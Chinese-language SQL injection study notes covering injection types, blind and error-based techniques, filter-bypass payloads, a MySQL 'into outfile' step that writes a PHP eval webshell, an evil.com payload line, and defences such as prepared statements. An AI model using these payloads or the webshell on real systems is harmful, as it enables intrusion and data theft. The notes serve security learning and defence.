# 一、简介

输入的字符串之中注入 SQL 指令，在设计不良的程序当中忽略了字符检查，那么这些注入进去的恶意指令就会被数据库服务器误认为是正常的 SQL 指令而运行，因此遭到破坏或是入侵。

# 二、注入种类

## Get 型注入

直接在地址栏中拼接 url

根据输入参数种类不同，要分辨是数字型注入还是字符型注入，同时注意语句是单引号闭合还是双引号闭合。

## Post 型注入

通过 post 请求传输数据

## Cookie 注入

cookie 注入其原理也和平时的注入一样，只是将参数以 cookie 的方式提交

## 盲注

当攻击者利用 SQL 注入漏洞进行攻击时，有时候 web 应用程序会显示，后端数据库执行 SQL 查询返回的错误信息。BlindSQL(盲注)是注入攻击的其中一种，向数据库发送 true 或false这样的问题，并根据应用程序返回的信息判断结果。这种攻击的出现是因为应用程序配置为只显示常规错误，但并没有解决SQL注入存在的代码问题.

Blind SQL (盲注)与常规注入很接近，不同的是数据库返回数据的检索方式，若数据库没有输出数据到web 页面，攻击者会询问一些列的 true 或 false 问题，强制从数据库获取数据。

```python
# 注：需要掌握的几个函数
length() #返回字符串的长度
substr() #截取字符串，语法substr(str,start,len)，例如substr('abc',1,1)截取a
ascii() #返回字符的ascii码，将字符变为数字
sleep() #将程序延时一段时间，如果使用网站的访问量过大，且全都延时100秒，数据库的资源被大量占用，服务器会崩溃
if(expr1,expr2,expr3) #判断语句，如果第一个语句正确就执行第二个语句，否则执行第三个语句	
```



### 基于时间注入的盲注

厂在存在注入点 POST 提交的参数后加睡眠函数,

eg：and if (length(database())>5 ,sleep(5),null) 

如果执行的页面响应时间大于 5 秒，那么肯定就存在注入，并且对应的 SQL 语句执行。

### 基于布尔的盲注

虽然没有报错信息，但是语句执行成功与否返回值不同 ，burp 抓包查看返回值的不同

可以使用 and 语句进行测试，要保证 and 之前的语句恒为真

```sql
select length(database());
select ascii(substr(database(),1,1))> N;
...
```

### 报错注入

通过报错来显示出具体的信息

数据库在执行SQL语句时，通常会先对 SQL 进行检测,如果 SQL 语句存在问，就会返回错误信息。通过这种机制，我们可以构造恶意的 SQL，触发数据库报错，而在报错信息中就存在着我们想要的信息。但通过这种方式，首先要保证SQL结构的正确性。

报错注入形式上是两个嵌套的查询，即select ..(select ..)，里面的那个 select 被称为子查询，他的执行顺序也是先执行子查询，然后再执行外面的select，双注入主要涉及到了几个sq|函数:

```sql
rand()		随机函数，返回0~1之间的某个值
floor(a)	取整函数，返回小于等于a,且.值 最接近a的一个整数
count()		聚合函数也称作计数函数，返回查询对象的总数
extractvalue()
group by clause		分组语句，按照查询结果分组

# 例子
# extractvalue() 以~,1开头的内容不是xml格式的语法，报错，但是会显示无法识别的内容是什么。函数能查询字符串的最大长度为32，就是说如果我们想要的结果超过32，就需要用 substring() 函数截取，一次查看32位
# concat 将多个字符串连接成一个字符串
and extractvalue(1,concat(0x7e,database(),0x7e))
```



查询的时候如果使用 rand() 的话，该值会被计算多次。在使用 group by 的时候，floor(rand(0)*2)会 被执行一次，如果虚表不存在记录，插入虚表的时候会再被执行一次。在一次多记录的查询过程中

floor(rand(0)*2)的值是定性的，为011011

select count(*) from table group by floor(rand(0)*2);

## 宽字节注入

宽字节注入源于程序员设置 MySQL 连接时错误配置为：set character_set_client=gbk，这样配置会引发编码转换从而导致的注入漏洞。

GB2312、GBK、GB18030、BIG5、Shift_JIS 等这些都是常说的宽字节，占两字节，ASCII占用一字节。PHP中编码为GBK，函数执行添加的是ASCII编码，MYSQL 默认字符集是 GBK 等宽字节字符集。

#### 原理

%DF：会被 PHP 当中的addslashes函数转义为 %DF，\ 既URL 里的 %5C，那么也就是说，%DF 会被转成 %DF%5C%27 倘若网站的字符集是 GBK，MYSQL 使用的编码也是 GBK 的话，就会认为 %DF%5C%27 是一个宽字符。

也就是 縗’，%27即单引号

最常使用的宽字节注入是利用 %df，其实我们只要第一个 ascii 码大于 128 就可以了，比如 ascii 码为 129 的就可以，但是我们怎么将他转换为 URL 编码呢，其实很简单，我们先将 129  (十进制)转换为十六进制，为 0x81，然后在十六进制前面加%即可，即为%81

GBK首字节对应 0x81-0xFE，尾字节对应 0x40-0xFE (除0x7F )

## xml 实体注入

xml 可扩展标记语言，标准通用标记语言的子集，是一种用于标记电子文件使其具有结构性的标记语言。

## base64注入

解码 构造语句 编码

Base64编码是从二进制到字符的过程，可用于在HTTP环境下传递较长的标识信息。Base64是网络上最常见的用于传输8Bit字节码的编码方式之一。

## 二阶注入

二阶注入，作为sql注入的一种，他不同于普通的SQL注入，恶意代码被注入到web应用中不立即执行，而是存储到后端数据库，在处理另一次不同请求时，应用检索到数据库中的恶意输入并利用它动态构建SQL语句，实现了攻击。可实现注入 Payload 触发二次 SQL 注入，注入 Payload 触发 XSS 攻击。

SQL 注入一般可分为两种，一阶注入(普通的 SQL 注入)和二阶 SQL 注入。一阶 SQL 注入发生在一个HTTP请求和响应中，系统对攻击输入立即反应执行。一阶注入的攻击过程归纳如下:

- 攻击者在 HTTP 请求中提交恶意 sql 语句。

- 应用处理恶意输入，使用恶意输入动态构建SQL语句。
- 如果攻击实现，在响应中向攻击者返回结构。

## 其他种类

### phpv9 authkey注入

### http请求头注入

常见的 http 请求中存在注入的参数

User-agent

Referer

X-Forwarded-For

client_ ip

#### HTTP User- Agent注入

$insert="INSERT INTO 'security' . uagents' ( uagent', ip _address ，username' ) VALUES ('$uagent','$IP', $uname)";

Payload内容:

#### HTTP Referer注入

登录位置、留言位置等等，注意 x-forwarded-for、client-ip、referer、hosts、user-agent是否包含注入点。

http://ceye.oio/)

# 三、其他数据库

## access 偏移注入 

借用数据库的自连接查询让数据库内部发生乱序，从而偏移出所需要的字段在我们的页面上显示!

### 场景

解决知道Access数据库中知道表名，但是得不到字段的sq|注入困境。

### 原因

字段名取名复杂，字典暴力破解字段名不成功。

### 流程

判断字段数order by

判断表名，使用unionselect*from表名来获取

开始偏移注入利用注入公式来注入

### Access偏移注入公式实践

偏移注入的基本公式为:

orderby出的字段数减去*号的字段数，然而再用orderby的字段数减去2倍刚才得出来的答案

也就是18-11=7

18-7*2=4

得到答案等于: 4

例如: http://192.168.2.133:5555/Production/PRODUCT_DETAIL.asp?id=1513 union select 1 ,2,3,4 ,a.id,b.id,* from (sys_ admin as a inner join sys_ admin as b on a.id = b.id)

\#使用access内连接

\#要知道id在admin表中存在

\#这里union select 1,2,3,4:顾名思义就是刚才得出来的长度。

\#后面的是sq|,可作公式。

http://192.168.2.133:5555/Production/PRODUCT_DETAIL.asp?id=1513+union+select+ 1,2,3,4,5,6,7,8,9,10,11,12,13, 14, 15, 16,17,18,19,20,21,22+from+ admin

[http://192](http://0.0.0.192/). 168.1.110/Production/PRODUCT_DETAIL.asp?id=1513+union+select+1,2,3,4,5,6,7,8,9,10,11, 12, 13, 14, 15,16,*+from+admin

22-16= 6

22-6*2= 10

http://192.168.1.110/Production/PRODUCT_DETAIL.asp id=1513+union+select+1,2,3,4,5,6,7,8,9,10,a.id,b.id,*+from (admin+as+a+inner+join+admin+as+b+on+a.id=b.id)

# 四、探测及绕过

## 判断数据库

- 存在msysobjects表为access、存在sysobjects表为sqlserver

- asp的后缀access居多，php的mysql居多，根据cms判断
- Access不支持注释符，MySQL和MSSQL支持

## 闭合语句

注入是字符型还是数字型

### 直接闭合

通过在URL中修改对应的ID值，为正常数字、大数字、字符(单引号、双引号、双单引号、括号)、反斜杠 \ 来探测URL中是否存在注入点。

### 注释符

注释符的作用:用于标记某段代码的作用，起到对代码功能的说明作用。但是注释掉的内容不会被执行。 

Mysq|中的注释符:

> 单行注释：--+ 或 --空格 或 # 
>
> 多行注释:：/* 多行注释内容*/
>
> 常用注释符：
>
>  //, --space, /\*\*/, #, --+, -- -, ;,%00,--a 
>
> ​		UNION /\*\*/ Select /\*\*/user,pwd,from user U/\*\*/ NION /\*\*/ SE/\*\*/ LECT /\*\*/user,pwd from usertable

> 注： 在url中注入时，可用+ 或者%20代替空格，或-- -来显示空格
>
> ​		符号和关键字替换 and-&&、or-||

在利用SQL注入漏洞过程中，注释符起到闭合单引号、多单引号、双引号、单括号、多括号的功能。

利用注释符别过滤不能成功闭合单引号等，换一种思路利用 or'1' = '1 闭合单引号等。 

## 逻辑运算（查看是否会带入执行）

很多时候提交包含引号的链接是，会提示非法字符，或者直接不返回任何信息，但这并不等于不存在SQL注入漏洞。此时可用经典的 1=1 和 1=2 法进行检测。方法很简单，就是直接在连接地址后面加上 and 1=1 和 and1=2 进行提交，如果页面返回不同的页面，则存在注入漏洞。

在 ^ 没有被过滤的时候可以利用它来测试，异或：xor 或^

```sql
' or 1=1--' **
1 ^ 0	# 就是 1 
1 ^ 1	# 就是 0
```



## 绕过

### 特殊符号绕过/逻辑绕过

- 换行符绕过：%0a、%0d针对过滤内容绕过

- **like绕过**：?id=1' or 1 like 1 绕过对“=”，“>”等的过滤

- **in绕过**：or '1' IN ('swords')

- **>,<绕过**：or 'password' > 'pass' or 1<3

- and 和 or 有可能不能使用，可以试下 && 和 || = 不能使用的情况，可以考虑尝试 <、>

- **过滤了空格**：替换为 + 进行绕过

  两个空格代替一个空格，用Tab代替空格 编码: hex,urlencode 空格URI _编码 %0a %09 TAB键(水平)

  %0a   换行   %0c   新的一页   %Od   return功能

  %0b TAB键(垂直) %20 %09 %0a %0b %0c %0d %a0 /**/ 括号绕过空格 在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来 select(user())from dual where 1=1 and 2=2;

- **\N绕过**：\N 其实相当于NULL字符

  ```sql
  select * from users where id=8E0union select 1,2,3,4,5,6,7,8,9,0 select * from users where id=8.0union select 1,2,3,4,5,6,7,8,9,0 select * from users where id=\Nunion select 1,2,3,4,5,6,7,8,9,0
  ```

### 大小写绕过

   如果程序中设置了过滤关键字，但是过滤过程中并没有对关键字组成进行深入分析过滤，导致只是对整体进行过滤。例如: and过滤。当然这种过滤只是发现关键字出现，并不会对关键字处理。

   通过修改关键字内字母大小写来绕过过滤措施。例如: AnD 1=1   

   例如:在进行探测当前表的字段数时，使用order by数字进行探测。如果过滤了order，可以使用OrdER来进行绕过。

   id=1+UnIoN/**/SeLeCT

### 内联注释绕过

   在mysql注中内联注释中的内容可以被当作SQL语句执行

   id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()-- -

   通常情况下，上面的代码可以绕过过滤器，请注意，我们用的是 Like而不是 =

### 双关键字绕过

   如果在程序中设置出现关键字之后替换为空，那么SQL注入攻击也不会发生。对于这样的过滤策略可以使用双写绕过。因为在过滤过程中只进行了以此替换。就是将关键字替换为对应的空。

   id=1+UNIunionON+SeLselectECT+1,2,3–

### 编码绕过

如URLEncode编码，ASCII,HEX,unicode编码绕过

一些unicode编码举例： 单引号：' %u0027 %u02b9 %u02bc %u02c8 %u2032 %uff07 %c0%27 %c0%a7 %e0%80%a7 空白： %u0020 %uff00 %c0%20 %c0%a0 %e0%80%a0 左括号(: %u0028 %uff08 %c0%28 %c0%a8 %e0%80%a8 右括号): %u0029 %uff09 %c0%29 %c0%a9 %e0%80%a9

or 1=1即%6f%72%20%31%3d%31

而Test也可以：CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)

十六进制编码：SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))

双重编码绕过：id=1%252f%252a*/UNION%252f%252a/SELECT%252f%252a*/1,2,password%252f%252a*/FROM%252f%252a*/Users--+

### 截断绕过

   %00,%0A,?,/0,////////////////........////////,%80-%99 目录字符串，在window下256字节、linux下4096字节时会达到最大值，最大值长度之后的字符将被丢弃。 ././././././././././././././././abc ////////////////////////abc ..1/abc/../1/abc/../1/abc

### 宽字节绕过

   PHP在开启magic_quotes_gpc或者使用addslashes、iconv等函数的时候，单引号（'）会被转义成\'。比如字符%bf在满足上述条件的情况下会变成%bf\'。其中反斜杠（\）的十六进制编码是%5C，单引号（'）的十六进制编码是%27，那么就可以得出%bf \'=%bf%5c%27。如果程序的默认字符集是GBK等宽字节字符集，则MySQL会认为%bf%5c是一个宽字符，也就是“縗”。也就是说%bf \'=%bf%5c%27=縗'。

### 万能密钥绕过

   用经典的or 1=1判断绕过,如or ‘swords’ =’swords

### +,-,.号拆解字符串绕过

   ?id=1' or '11+11'='11+11' "-"和”.

### 等价函数与命令绕过

  #### 函数或变量

hex()、bin() ==> ascii() sleep() ==> benchmark() concat_ws()==>group_concat() mid()、substr() ==> substring() @@user ==> user() @@datadir ==> datadir() 

举例：substring()和substr()无法使用时：

```sql
?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74

# 一句
substr((select 'password'),1,1) = 0x70 strcmp(left('password',1), 0x69) = 1		 strcmp(left('password',1), 0x70) = 0 strcmp(left('password',1), 0x71) = -1 

```

## 特殊的绕过函数

1. greatest函数

   通过绕过不能使用大小于符号的情况 greatest(a,b)，返回a和b中较大的那个数。 当我们要猜解user()第一个字符的ascii码是否小于等于150时，可使用： 

```sql
mysql> select greatest(ascii(mid(user(),1,1)),150)=150; +------------------------------------------+ | greatest(ascii(mid(user(),1,1)),150)=150 | +------------------------------------------+ | 1 | +------------------------------------------+ 
```

如果小于150，则上述返回值为True。 

2. substr函数

   通过绕过不能使用逗号的情况 mid(user() from 1 for 1) 或 substr(user() from 1 for 1) mysql> 

   ```sql
   select ascii(substr(user() from 1 for 1)) < 150; +------------------------------------------+ | ascii(substr(user() from 1 for 1)) < 150 | +------------------------------------------+ | 1 | +------------------------------------------+ 
   ```

3. 使用数学运算函数在子查询中报错 exp(x)函数的作用： 取常数e的x次方，其中，e是自然对数的底。 ~x 是一个一元运算符，将x按位取补

   ```sql
   select exp(~(select*from(select user())a))
   # mysql> select exp(~(select*from(select user())a)); ERROR 1690 (22003): DOUBLE value is out of range in ‘exp(~((select ‘root@localhost’ from dual)))’ 
   ```

   这条查询会出错，是因为exp(x)的参数x过大，超过了数值范围，分解到子查询，就是： (select*from(select user())a) 得到字符串 root@localhost 表达式’root@localhost’被转换为0，按位取补之后得到一个非常的大数，它是MySQL中最大的无符号整数

4. 生僻函数

   MySQL/PostgreSQL 支持XML函数：Select UpdateXML(‘<script x=_></script> ’,’/script/@x/’,’src=//[evil.com](http://evil.com/)’);

   ```sql
   ?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1)) SELECT xmlelement(name img,xmlattributes(1as src,'a\l\x65rt(1)'as \117n\x65rror));　//postgresql ?id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1))); and 1=(updatexml(1,concat(0x5c,(select user()),0x5c),1)) and extractvalue(1, concat(0x5c, (select user()),0x5c))
   ```

# 五、高级利用

## 思路

1. 判断 MySQL 版本

   MySQL的版本小于4.0时，是不支持union select联合查询的；当MySQL版本大于5.0时，有个默认数据库 information_schema，里面存放着所有数据库的信息(比如表名、列名、对应权限等)，通过这个数据库，我们就可以跨库查询，爆表爆列。

   5.0 以上时可以通过爆的方式获得用户名密码，5.0 以下或者 5.0 以上不能爆时(比如限制了 information_schema 数据库)，可以通过盲注获得用户名密码。

## mysql读文件

mysql 可以进行对文件进行读写

读取前提：用户权限足够高，尽量具有root权限、(secure_file_priv) 不为NULL。

    ```sql
    union select 1,2,load_file("")
    ```



## mysql写文件

mysql可以进行对文件进行读写

写入前提：权限足够、set global general_log = on

### mysql 写入 websell

magic_quotes_gpc 为 off

写入一句话木马，<?php @eval($_POST['x']);?> 使用中国菜刀/中国蚁剑连接。

```sql
-1')) union select 1,"<?php@eval($_POST['x']); ?>",3 into outfile "C:\\phpStudy\\WWW\\sqli-labs\\Less-7\\4.php" -- +
```

%20代表空格，%27代表单引号 谷歌和360等可以转换编码，火狐不会

# 六、防御

## 检查数据类型

检查输入数据的数据类型，在很大程度上可以对抗SQL注入。

settype($offset,'integer');

$query="SELECT id,name FROM products ORDER BY name LIMIT 20 OFFSET $offset;";

或者

$query=sprintf("SELECT id,name FROM products ORDER BY name LIMIT 20 OFFSET %d;",$offset);

还有：is_numeric() , ctype_digit()

5.使用安全函数

OWASP ESAPI中的实现：

ESAPI.encoder().encodeForSQL(new OracleCodec(),queryparam);

在使用时，

Codec ORACLE_CODEC = new OracleCodec();

String query = "SELECT user_id FROM user_data WHERE user_name = '" + ESAPI.encoder().encodeForSQL(ORACLE_CODEC,req.getParameter("userID")) + "' and user_password = '" + ESAPI.encoder().encodeForSQL(ORACLE_CODEC,req.getParameter("pwd")) + "'";

：https://blog.csdn.net/hitwangpeng/article/details/45534787

## 预编译

采用sql语句预编译和绑定变量，是防御sql注入的最佳方法

```php
String sql = "select id, no from user where id=?";

PreparedStatement ps = conn.prepareStatement(sql);

ps.setInt(**1**, id);

ps.executeQuery();
```

如上所示，就是典型的采用 sql 语句预编译和绑定变量 。为什么这样就可以防止sql 注入呢？

其原因就是：

   采用了PreparedStatement，就会将sql语句：

   "select id, no from user where id=?" 

   预先编译好，也就是SQL引擎会预先进行语法分析，产生语法树，生成执行计划，也就是说，无论后面输入的是什么，都不会影响该sql语句的 语法结构了，因为语法分析已经完成了，而语法分析主要是分析sql命令，比如 select ,from ,where ,and, or ,order by 等等。所以即使你后面输入了这些sql命令，也不会被当成sql命令来执行了，因为这些sql命令的执行， 必须先的通过语法分析，生成执行计划，既然语法分析已经完成，已经预编译过了，那么后面输入的参数，是绝对不可能作为sql命令来执行的，只会被当做字符串字面值参数。所以sql语句预编译可以防御sql注入。

2> 但是不是所有场景都能够采用 sql语句预编译，有一些场景必须的采用字符串拼接的方式，此时，我们严格检查参数的数据类型，还有可以使用一些安全函数，来方式sql注入。

比如 String sql = "select id,no from user where id=" + id;

在接收到用户输入的参数时，我们就严格检查id，只能是int型。复杂情况可以使用正则表达式来判断。这样也是可以防止sql注入的。

安全函数的使用，比如：

MySQLCodec codec = new MySQLCodec(Mode.STANDARD);

name = ESAPI.encoder().encodeForSQL(codec, name);

String sql = "select id,no from user where name=" + name;

**ESAPI.encoder().encodeForSQL(codec, name)**

该函数会将 name 中包含的一些特殊字符进行编码，这样 sql 引擎就不会将name中的字符串当成sql命令来进行语法分析了。

## 使用存储过程

存储过程是在大型数据库系统中，一组为了完成特定功能或经常使用的SQL语句集。

存储过程可避免SQL注入，但也可能会存在注入问题，因此 应该尽量避免在存储过程中使用动态的SQL语句。如果无法避免，则应该使用严格的输入过滤或者是编码函数来处理用户的输入数据。

CallableStatement cs = connection.prepareCall("{call sp_getAccountBalance(?)}");

cs.setString(1,custname);

其中sp_getAccountBalance是预先在数据库中定义好的存储过程。

示例：存储过程如果编写不当，依然有SQL注入的风险

  create proc findUserid @id varchar(100)

as

  exec('select * from Student where StudentNo='+@id);

go

传入参数3 or 1=1将查询出全部数据，改进代码如下：

  create proc findUserid @id varchar(100)

as

  select * from Student where StudentNo=@id

go

当再次传入参数3 or 1=1时，SQL执行器会抛出错误：

消息245，级别16，状态1，过程findUserid，第3行

在将varchar值'3 or 1=1' 转换成数据类型int时失败



# X、php 相关

**一、**

   pdo使用query或者exec来执行 sql语句时，此时不经过预编译，直接执行。

   1.用query的情况

<?php

if(!isset($_GET['id']))

{die();}

$dbh = new PDO('mysql:host=localhost;dbname=test_data','root','');

$sql="SELECT * FROM `users` WHERE `id`=".$_GET['id'].";";

$result=$dbh->query($sql);

foreach ($result->fetch(PDO::FETCH_ASSOC) as $item)   {echo $item;}

foreach ($dbh->errorInfo() as $row)   {echo $row;}

\>

  2.用exec的情况

$result=$dbh->exec($sql);

**二、第二种情况**

  在sql预编译前，修改了SQL语句

  PDO预编译，php会把sql语句先放到数据库去做执行以下。

  所以说，就算污染了SQL语句，导致在预编译之后，无法传入变量，执行语句也没关系，因为在预编译之时，SQL语句就已经被执行了。





**5.哪些地方没有魔术引号的保护**

（1)$_SERVER 变量

PHP的$_SERVER变量缺少 magic_quotes_gpc 的保护，导致近年来X-Forwarded-For的漏洞猛爆，所以很多程序员考虑X-Forwarded-For，但是其他的变呢？

（2）getenv()得到的变量（使用类似于$_SERVER 变量）

（3）$HTTP_RAW_POST_DATA与PHP输入、输出流

